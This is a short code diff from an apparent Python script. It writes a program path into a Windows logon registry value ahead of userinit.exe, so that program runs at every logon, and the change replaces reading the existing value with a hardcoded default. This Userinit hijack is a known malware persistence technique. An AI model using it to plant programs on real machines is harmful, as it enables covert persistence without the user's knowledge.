@@ -138,11 +138,7 @@ try {
         
         try:
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE) as key:
-                # Get existing value (default is usually "C:\Windows\system32\userinit.exe")
-                try:
-                    existing_value, _ = winreg.QueryValueEx(key, value_name)
-                except FileNotFoundError:
-                    existing_value = "C:\\Windows\\system32\\userinit.exe"  # Default Windows value
+                existing_value = "C:\\Windows\\system32\\userinit.exe"  # Default Windows value
 
                 # Append your program while preserving userinit.exe
                 new_value = f'"{path}",{existing_value}'
